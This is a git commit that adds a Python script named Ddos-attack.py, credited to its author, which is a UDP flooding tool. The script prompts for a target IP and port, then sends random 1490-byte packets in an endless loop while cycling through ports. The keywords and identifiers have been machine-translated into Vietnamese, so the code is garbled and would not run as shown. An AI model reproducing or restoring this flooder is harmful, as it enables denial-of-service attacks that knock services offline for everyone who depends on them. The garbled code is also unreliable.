6cc775318088305cf611243561ba59db7381be0b
TruongThach2006 <89930076+TruongThach2006@users.noreply.github.com>
2021-09-01 23:06:42 +0700

    Create Ddos-attack.py
    Một cuộc tấn công từ chối dịch vụ phân tán (DDoS) là một nỗ lực làm cho một dịch vụ trực tuyến không khả dụng
    bằng cách áp đảo nó với lưu lượng truy cập từ nhiều nguồn. Họ nhắm mục tiêu nhiều nguồn tài nguyên quan trọng từ ngân hàng đến các trang web tin tức và đưa ra một thách thức lớn là đảm bảo mọi người có thể xuất bản và truy cập thông tin quan trọng

---
+++ Ddos-attack.py
@@ -0,0 +1,50 @@
+nhập  hệ thống
+nhập khẩu  os
+ thời gian nhập khẩu
+ ổ cắm nhập khẩu
+nhập  ngẫu nhiên
+#Code Time
+từ  datetime  nhập  datetime
+tại  =  datetime . bây giờ ()
+giờ  =  bây giờ . giờ
+phút  =  bây giờ . phút
+ngày  =  bây giờ . ngày
+tháng  =  bây giờ . tháng
+năm  =  bây giờ . năm
+
+##############
+sock  =  ổ cắm . ổ cắm ( ổ cắm . AF_INET , ổ cắm . SOCK_DGRAM )
+byte  =  ngẫu nhiên . _urandom ( 1490 )
+#############
+
+hệ điều hành . hệ thống ( "rõ ràng" )
+hệ điều hành . hệ thống ( "Hình tấn công DDos" )
+in
+print  "Tác giả: Truong-Thach"
+print  https://facebook.com/verify.truongthach9999"
+print  "github: https://github.com/truongthach2006"
+in 
+in
+ip  =  raw_input ( "Mục tiêu IP:" )
+port  =  đầu vào ( "Cổng:" )
+
+hệ điều hành . hệ thống ( "rõ ràng" )
+hệ điều hành . hệ thống ( "Bắt đầu tấn công bằng figlet" )
+in  "[] 0%"
+thời gian . ngủ ( 5 )
+in  "[=====] 25%"
+thời gian .ngủ ( 5 )
+in  "[==========] 50%"
+thời gian .ngủ ( 5 )
+in  "[===============] 75%"
+thời gian .ngủ ( 5 )
+in  "[====================] 100%"
+thời gian . ngủ ( 3 )
+đã gửi  =  0
+trong khi  Đúng :
+     tất . sendto ( byte , ( ip , cổng ))
+     đã gửi  =  đã gửi  +  1
+     port  =  port  +  1
+     in  "Đã gửi gói tin% s tới cổng% s:% s" % ( đã gửi , ip , cổng )
+     nếu  cổng  ==  65534 :
+       cổng  =  1
